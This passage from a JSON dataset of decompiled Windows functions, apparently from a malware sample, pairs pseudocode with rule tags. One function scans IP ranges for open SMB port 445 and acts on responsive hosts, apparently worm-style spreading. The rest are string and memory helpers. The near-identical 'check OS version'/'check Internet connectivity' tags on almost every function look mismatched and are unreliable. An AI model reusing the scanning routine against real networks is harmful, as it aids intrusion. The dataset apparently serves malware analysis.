(*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    fcn.00402b57(arg_8h_00, iVar1 * 2 + 2);\n    return var_4h;\n}\n",
        "token_count": 438
    },
    "00404148": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: buf\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404148(uint32_t hostlong, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_48h;\n    uint var_44h;\n    uint name;\n    uint var_34h;\n    uchar uStack52;\n    uint uStack51;\n    ushort uStack47;\n    uchar uStack45;\n    uint namelen;\n    uint optlen;\n    uint argp;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t optval;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint buf;\n    \n    name._0_2_ = 2;\n    var_14h = hostlong + in_EAX;\n    name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(0x1bd);\n    var_34h = 0;\n    uStack52 = 0;\n    uStack51 = 0;\n    uStack47 = 0;\n    uStack45 = 0;\n    var_ch = fcn.00404d22(0x200, 4);\n    var_18h = fcn.00404d22(0x200, 4);\n    if (hostlong < hostlong + in_EAX) {\n        while (uVar4 = 0,  hostlong < var_14h) {\n            do {\n                if (0x1ff < uVar4) break;\n                argp = 1;\n                var_34h = (*_sym.imp.WS2_32.dll_htonl)(hostlong);\n                hostlong = hostlong + 1;\n                iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n                if (((iVar2 != 0) && (iVar3 = (*_sym.imp.WS2_32.dll_ioctlsocket)(iVar2, 0x8004667e, &argp),  iVar3 == 0)\n                    ) && ((iVar3 = (*_sym.imp.WS2_32.dll_connect)(iVar2, &name, 0x10),  iVar3 == 0 ||\n                          (iVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)(),  iVar3 == 0x2733)))) {\n                    *(var_ch + uVar4 * 4) = iVar2;\n                    uVar4 = uVar4 + 1;\n                }\n            } while (hostlong < var_14h);\n            if (uVar4 != 0) {\n                fcn.0040408a(var_ch);\n                var_8h = 0;\n                do {\n                    uVar4 = uVar4 - 1;\n                    piVar1 = var_ch + uVar4 * 4;\n                    var_1ch = uVar4;\n                    if (*piVar1 != 0) {\n                        optlen = 4;\n                        iVar2 = (*_sym.imp.WS2_32.dll_getsockopt)(*piVar1, 0xffff, 0x1007, &optval, &optlen);\n                        if ((iVar2 == 0) && (optval == 0)) {\n                            iVar2 = (*_sym.imp.WS2_32.dll_recv)(*piVar1, &buf, 1, 2);\n                            if (iVar2 == -1) {\n                                optval = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                            }\n                            if ((iVar2 == 0) || (uVar4 = var_1ch,  optval == 0x2733)) {\n                                namelen = 0x10;\n                                (*_sym.imp.WS2_32.dll_getpeername)(*piVar1, &var_48h, &namelen);\n                                *(var_18h + var_8h * 4) = var_44h;\n                                uVar4 = var_1ch;\n                                var_8h = var_8h + 1;\n                            }\n                        }\n                    }\n                    (*_sym.imp.WS2_32.dll_closesocket)(*piVar1);\n                } while (uVar4 != 0);\n                while (var_8h != 0) {\n                    var_8h = var_8h + -1;\n                    iVar2 = fcn.00401d71(var_44h, arg_ch);\n                    if (iVar2 == 0) goto code_r0x004042fa;\n                }\n            }\n            if (var_14h <= hostlong) break;\n        }\n    }\ncode_r0x004042fa:\n    fcn.00404d6a(var_ch);\n    fcn.00404d6a(var_18h);\n    return;\n}\n",
        "token_count": 1086
    },
    "00404525": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404525(int32_t arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t extraout_DX;\n    int16_t extraout_DX_00;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    uint var_ch;\n    ushort var_8h;\n    ushort var_6h;\n    int16_t *var_4h;\n    \n    var_ch._0_2_ = 0x5c;\n    var_8h = 0x3f;\n    var_ch._2_2_ = var_ch;\n    var_6h = var_ch;\n    iVar2 = fcn.00404f6c(arg_ch, &var_ch, 4);\n    if (iVar2 == 0) {\n        arg_ch = arg_ch + 4;\n    }\n    var_4h = fcn.00404e69(arg_ch, 0x5c);\n    if (var_4h != NULL) {\n        var_4h = var_4h + 1;\n    }\n    piVar4 = *(arg_8h + 0xc);\n    if (piVar4 != NULL) {\n        arg_8h = 0;\n        piVar3 = piVar4;\n        while (iVar1 = *piVar3,  piVar5 = arg_ch,  iVar1 != 0) {\n            while (((iVar1 != 0 && (*piVar5 != 0)) && (iVar1 = fcn.00408681(),  extraout_DX == iVar1))) {\n                piVar3 = piVar3 + 1;\n                iVar1 = *piVar3;\n                piVar5 = piVar5 + 1;\n            }\n            if (*piVar3 == *piVar5) goto code_r0x004045d3;\n            arg_8h = arg_8h + 1;\n            do {\n                iVar1 = *piVar3;\n                piVar3 = piVar3 + 1;\n            } while (iVar1 != 0);\n        }\n        arg_8h = -1;\ncode_r0x004045d3:\n        if (-1 < arg_8h) {\n            return 0;\n        }\n        if (var_4h != NULL) {\n            iVar2 = 0;\n            while (iVar1 = *piVar4,  piVar3 = var_4h,  iVar1 != 0) {\n                while (((iVar1 != 0 && (*piVar3 != 0)) && (iVar1 = fcn.00408681(),  extraout_DX_00 == iVar1))) {\n                    piVar4 = piVar4 + 1;\n                    iVar1 = *piVar4;\n                    piVar3 = piVar3 + 1;\n                }\n                if (*piVar4 == *piVar3) goto code_r0x0040462c;\n                iVar2 = iVar2 + 1;\n                do {\n                    iVar1 = *piVar4;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n            }\n            iVar2 = -1;\ncode_r0x0040462c:\n            if (-1 < iVar2) {\n                return 0;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 749
    },
    "00404640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404640(int16_t **arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t extraout_DX;\n    int16_t extraout_DX_00;\n    int16_t extraout_DX_01;\n    int16_t extraout_DX_02;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint var_10h;\n    ushort var_ch;\n    ushort var_ah;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_10h._0_2_ = 0x5c;\n    var_ch = 0x3f;\n    var_10h._2_2_ = var_10h;\n    var_ah = var_10h;\n    iVar2 = fcn.00404f6c(arg_ch, &var_10h, 4);\n    if (iVar2 == 0) {\n        arg_ch = arg_ch + 4;\n    }\n    var_8h = fcn.00404e69(arg_ch, 0x5c);\n    if (var_8h != NULL) {\n        var_8h = var_8h + 1;\n    }\n    var_4h = fcn.00404e69(arg_ch, 0x2e);\n    if (var_4h != NULL) {\n        var_4h = var_4h + 1;\n    }\n    piVar5 = *arg_8h;\n    if (piVar5 == NULL) {\ncode_r0x0040470c:\n        piVar5 = arg_8h[1];\n        if ((piVar5 != NULL) && (var_4h != NULL)) {\n            iVar2 = 0;\n            while (iVar1 = *piVar5,  piVar6 = var_4h,  iVar1 != 0) {\n                while (((iVar1 != 0 && (*piVar6 != 0)) && (iVar1 = fcn.00408681(),  extraout_DX_00 == iVar1))) {\n                    piVar5 = piVar5 + 1;\n                    iVar1 = *piVar5;\n                    piVar6 = piVar6 + 1;\n                }\n                if (*piVar5 == *piVar6) goto code_r0x00404768;\n                iVar2 = iVar2 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n            }\n            iVar2 = -1;\ncode_r0x00404768:\n            if (-1 < iVar2) goto code_r0x0040482d;\n        }\n        piVar5 = arg_8h[2];\n        if (piVar5 != NULL) {\n            arg_8h = NULL;\n            piVar6 = piVar5;\n            while (iVar1 = *piVar6,  piVar4 = arg_ch,  iVar1 != 0) {\n                while (((iVar1 != 0 && (*piVar4 != 0)) && (iVar1 = fcn.00408681(),  extraout_DX_01 == iVar1))) {\n                    piVar6 = piVar6 + 1;\n                    iVar1 = *piVar6;\n                    piVar4 = piVar4 + 1;\n                }\n                if (*piVar6 == *piVar4) goto code_r0x004047d0;\n                arg_8h = arg_8h + 1;\n                do {\n                    iVar1 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                } while (iVar1 != 0);\n            }\n            arg_8h = 0xffffffff;\ncode_r0x004047d0:\n            if (-1 < arg_8h) goto code_r0x0040482d;\n            if (var_8h != NULL) {\n                iVar2 = 0;\n                while (iVar1 = *piVar5,  piVar6 = var_8h,  iVar1 != 0) {\n                    while (((iVar1 != 0 && (*piVar6 != 0)) && (iVar1 = fcn.00408681(),  extraout_DX_02 == iVar1))) {\n                        piVar5 = piVar5 + 1;\n                        iVar1 = *piVar5;\n                        piVar6 = piVar6 + 1;\n                    }\n                    if (*piVar5 == *piVar6) goto code_r0x00404829;\n                    iVar2 = iVar2 + 1;\n                    do {\n                        iVar1 = *piVar5;\n                        piVar5 = piVar5 + 1;\n                    } while (iVar1 != 0);\n                }\n                iVar2 = -1;\ncode_r0x00404829:\n                if (-1 < iVar2) goto code_r0x0040482d;\n            }\n        }\n        uVar3 = 1;\n    }\n    else {\n        if (var_4h != NULL) {\n            iVar2 = 0;\n            while (iVar1 = *piVar5,  piVar6 = var_4h,  iVar1 != 0) {\n                while (((iVar1 != 0 && (*piVar6 != 0)) && (iVar1 = fcn.00408681(),  extraout_DX == iVar1))) {\n                    piVar5 = piVar5 + 1;\n                    iVar1 = *piVar5;\n                    piVar6 = piVar6 + 1;\n                }\n                if (*piVar5 == *piVar6) goto code_r0x00404704;\n                iVar2 = iVar2 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n            }\n            iVar2 = -1;\ncode_r0x00404704:\n            if (-1 < iVar2) goto code_r0x0040470c;\n        }\ncode_r0x0040482d:\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 1371
    },
    "004048ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048ba(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uStack52;\n    int32_t iStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uchar auStack24 [20];\n    \n    uStack32 = 0;\n    arg_8h_00 = fcn.00404cfe(0x10000);\n    arg_8h_01 = fcn.00404cfe(0x10000);\n    iVar4 = **arg_8h;\n    iStack28 = fcn.00405731((*arg_8h)[1], iVar4, iVar4 + 0xc);\n    if (((iStack28 != 0) && (arg_8h_00 != 0)) && (arg_8h_01 != 0)) {\n        fcn.00402e5c(&uStack32, 0);\n        while( true ) {\n            pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n            piVar1 = arg_8h[1];\n            piVar3 = piVar1 + 3;\n            while( true ) {\n                (*pcVar2)(piVar3);\n                piVar3 = fcn.00402975(uStack52);\n                if ((piVar3 != NULL) || ((*(piVar1 + 10) & 1) != 0)) break;\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg_8h_01);\n                (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(piVar1[1], 0xffffffff);\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg_8h_01);\n            if (iStack36 == 0) goto code_r0x004049fd;\n            iVar4 = fcn.00404c0c();\n            if (iVar4 != 0) break;\n            iVar4 = fcn.0040861d(arg_8h_01, 0x7fff, 2);\n            if (iVar4 != 0) {\n                fcn.0040895e(auStack24);\n                piVar3 = *arg_8h;\n                iVar4 = fcn.00405709();\n                if (iVar4 == 0) goto code_r0x004049fd;\n                fcn.00405dcb(iStack28, auStack24, arg_8h_01, *(*piVar3 + 0x24));\n            }\n        }\n        fcn.0040284f();\ncode_r0x004049fd:\n        fcn.00402e5c(uStack32, 1);\n    }\n    fcn.0040284f();\n    if (iStack28 != 0) {\n        fcn.00405697();\n    }\n    if (arg_8h_00 != 0) {\n        fcn.00404d6a(arg_8h_00);\n    }\n    if (arg_8h_01 != 0) {\n        fcn.00404d6a(arg_8h_01);\n    }\n    return 0;\n}\n",
        "token_count": 729
    },
    "00404a4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a4c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack28;\n    int32_t iStack24;\n    int32_t aiStack20 [4];\n    \n    uStack28 = 0;\n    iVar2 = fcn.00402789();\n    if (iVar2 != 0) {\n        fcn.00402e5c(&uStack28, 0);\n        iStack24 = arg_8h;\n        uVar4 = 0;\n        aiStack20[0] = iVar2;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 1, fcn.004048ba, &iStack24, 0, 0);\n            aiStack20[uVar4 + 1] = iVar3;\n            if (iVar3 == 0) break;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 2);\n        if (uVar4 == 2) {\n            fcn.00408338(*(arg_8h + 0xc), fcn.0040483d, &iStack24, 0x7fff, 0x80);\n        }\n        iVar3 = fcn.00404c0c();\n        if (iVar3 != 0) {\n            fcn.0040284f();\n        }\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(iVar2 + 8), 0xffffffff);\n        fcn.0040284f();\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar4, &iStack24, 1, 0xffffffff);\n        while (uVar4 != 0) {\n            piVar1 = aiStack20 + uVar4;\n            uVar4 = uVar4 - 1;\n            if (*piVar1 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*piVar1);\n            }\n        }\n        fcn.00402e5c(uStack28, 1);\n        fcn.00402730();\n    }\n    fcn.004044c6();\n    fcn.004057e9(*(arg_8h + 4));\n    fcn.00404d6a(*(arg_8h + 0xc));\n    fcn.00404d6a(arg_8h);\n    return 0;\n}\n",
        "token_count": 554
    },
    "00404c71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404c71(int32_t arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_10h != 0) {\n        iVar1 = arg_8h - arg_ch;\n        do {\n            arg_10h = arg_10h + -1;\n            arg_ch[iVar1] = *arg_ch;\n            arg_ch = arg_ch + 1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 127
    },
    "00404cfe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cfe(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h == 0) {\n        arg_8h = 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h);\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    return;\n}\n",
        "token_count": 95
    },
    "00404d43": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d43(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    if (arg_ch == 0) {\n        arg_ch = 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h, arg_ch);\n    (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar1);\n    return;\n}\n",
        "token_count": 99
    },
    "00404eb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404eb8(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*arg_ch != 0) {\n        iVar1 = *arg_8h;\n        if (iVar1 != 0) {\n            iVar3 = arg_8h - arg_ch;\n            piVar2 = arg_ch;\njoined_r0x00404edd:\n            do {\n                if (iVar1 != 0) {\n                    if (*piVar2 == 0) {\n                        return arg_8h;\n                    }\n                    if (*(iVar3 + piVar2) == *piVar2) {\n                        iVar1 = *(iVar3 + piVar2 + 1);\n                        piVar2 = piVar2 + 1;\n                        goto joined_r0x00404edd;\n                    }\n                }\n                if (*piVar2 == 0) {\n                    return arg_8h;\n                }\n                arg_8h = arg_8h + 1;\n                iVar1 = *arg_8h;\n                iVar3 = iVar3 + 2;\n                piVar2 = arg_ch;\n            } while (iVar1 != 0);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 296
    },
    "00404f16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00404f16(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    if (*arg_ch != '\\0') {\n        cVar1 = *arg_8h;\n        if (cVar1 != '\\0') {\n            iVar3 = arg_8h - arg_ch;\n            pcVar2 = arg_ch;\njoined_r0x00404f35:\n            do {\n                if (cVar1 != '\\0') {\n                    if (*pcVar2 == '\\0') {\n                        return arg_8h;\n                    }\n                    if (pcVar2[iVar3] == *pcVar2) {\n                        cVar1 = (pcVar2 + 1)[iVar3];\n                        pcVar2 = pcVar2 + 1;\n                        goto joined_r0x00404f35;\n                    }\n                }\n                if (*pcVar2 == '\\0') {\n                    return arg_8h;\n                }\n                arg_8h = arg_8h + 1;\n                cVar1 = *arg_8h;\n                iVar3 = iVar3 + 1;\n                pcVar2 = arg_ch;\n            } while (cVar1 != '\\0');\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 294
    },
    "00404f6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404f6c(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != 0)) && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1)\n        {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 144
    },
    "00404fa3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404fa3(char *arg_8h, char *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != '\\0')) && (*arg_8h == *arg_ch));\n            arg_8h = arg_8h + 1) {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "0040500c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040500c(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *arg_8h;\n    while (iVar1 != 0) {\n        arg_8h = arg_8h + 1;\n        iVar1 = *arg_8h;\n    }\n    iVar2 = arg_8h - arg_ch;\n    do {\n        iVar1 = *arg_ch;\n        *(iVar2 + arg_ch) = iVar1;\n        arg_ch = arg_ch + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 148
    },
    "0040503b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040503b(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = *arg_8h;\n    while (cVar1 != '\\0') {\n        arg_8h = arg_8h + 1;\n        cVar1 = *arg_8h;\n    }\n    iVar2 = arg_8h - arg_ch;\n    do {\n        cVar1 = *arg_ch;\n        arg_ch[iVar2] = cVar1;\n        arg_ch = arg_ch + 1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 147
    },
    "00405061": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405061(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_8h != 0) {\n        iVar1 = fcn.00404d94(arg_8h);\n        iVar1 = fcn.00404d22(iVar1 + 1, 2);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00404fd3(iVar1, arg_8h);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 129
    },
    "00405093": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405093(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00404d81(arg_8h);\n    iVar1 = fcn.00404cfe(iVar1 + 1);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        fcn.00404ff2(iVar1, arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 129
    },
    "004050cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004050cc(uint16_t **arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t *unaff_EBX;\n    uint16_t *puVar5;\n    uint32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        *arg_8h = unaff_EBX;\n    }\n    var_4h = 0;\n    uVar1 = *unaff_EBX;\n    puVar5 = unaff_EBX + 1;\n    while (uVar4 = uVar1,  uVar4 == 0x20) {\n        uVar1 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar1 == 0x2d) {\n        arg_10h = arg_10h | 2;\ncode_r0x00405103:\n        uVar4 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    else if (uVar1 == 0x2b) goto code_r0x00405103;\n    if (((arg_ch < 0) || (arg_ch == 1)) || (0x24 < arg_ch)) {\n        if (arg_8h != NULL) {\n            *arg_8h = unaff_EBX;\n        }\n        return 0;\n    }\n    if (arg_ch == 0) {\n        if (uVar4 != 0x30) {\n            arg_ch = 10;\n            goto code_r0x00405177;\n        }\n        if ((*puVar5 != 0x78) && (*puVar5 != 0x58)) {\n            arg_ch = 8;\n            goto code_r0x00405177;\n        }\n        arg_ch = 0x10;\n    }\n    else if ((arg_ch != 0x10) || (uVar4 != 0x30)) goto code_r0x00405177;\n    if ((*puVar5 == 0x78) || (*puVar5 == 0x58)) {\n        uVar4 = puVar5[1];\n        puVar5 = puVar5 + 2;\n    }\ncode_r0x00405177:\n    uVar3 = 0xffffffff / arg_ch;\n    do {\n        iVar2 = uVar4;\n        if (iVar2 - 0x30U < 10) {\n            uVar4 = uVar4 - 0x30;\n        }\n        else if (iVar2 - 0x41U < 6) {\n            uVar4 = uVar4 - 0x37;\n        }\n        else {\n            if (5 < iVar2 - 0x61U) {\ncode_r0x004051d1:\n                puVar5 = puVar5 + -1;\n                if ((arg_10h & 8) == 0) {\n                    if (arg_8h != NULL) {\n                        puVar5 = unaff_EBX;\n                    }\n                    var_4h = 0;\n                }\n                else if (((arg_10h & 4) != 0) ||\n                        (((arg_10h & 1) == 0 &&\n                         ((((arg_10h & 2) != 0 && (0x80000000 < var_4h)) ||\n                          (((arg_10h & 2) == 0 && (0x7fffffff < var_4h)))))))) {\n                    if ((arg_10h & 1) == 0) {\n                        var_4h = ((arg_10h & 2) != 0) + 0x7fffffff;\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                if (arg_8h != NULL) {\n                    *arg_8h = puVar5;\n                }\n                if ((arg_10h & 2) == 0) {\n                    return var_4h;\n                }\n                return -var_4h;\n            }\n            uVar4 = uVar4 - 0x57;\n        }\n        if (arg_ch <= uVar4) goto code_r0x004051d1;\n        if ((var_4h < uVar3) || ((var_4h == uVar3 && (uVar4 <= 0xffffffff % arg_ch)))) {\n            var_4h = var_4h * arg_ch + uVar4;\n            arg_10h = arg_10h | 8;\n        }\n        else {\n            arg_10h = arg_10h | 0xc;\n            if (arg_8h == NULL) goto code_r0x004051d1;\n        }\n        uVar4 = *puVar5;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 1084
    },
    "00405295": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405295(char **arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *unaff_EBX;\n    char *pcVar4;\n    uint32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        *arg_8h = unaff_EBX;\n    }\n    var_4h = 0;\n    cVar2 = *unaff_EBX;\n    pcVar4 = unaff_EBX + 1;\n    while (cVar2 == ' ') {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    }\n    if (cVar2 == '-') {\n        arg_10h = arg_10h | 2;\ncode_r0x004052c6:\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    }\n    else if (cVar2 == '+') goto code_r0x004052c6;\n    if (((arg_ch < 0) || (arg_ch == 1)) || (0x24 < arg_ch)) {\n        if (arg_8h != NULL) {\n            *arg_8h = unaff_EBX;\n        }\n        return 0;\n    }\n    if (arg_ch == 0) {\n        if (cVar2 != '0') {\n            arg_ch = 10;\n            goto code_r0x0040532e;\n        }\n        if ((*pcVar4 != 'x') && (*pcVar4 != 'X')) {\n            arg_ch = 8;\n            goto 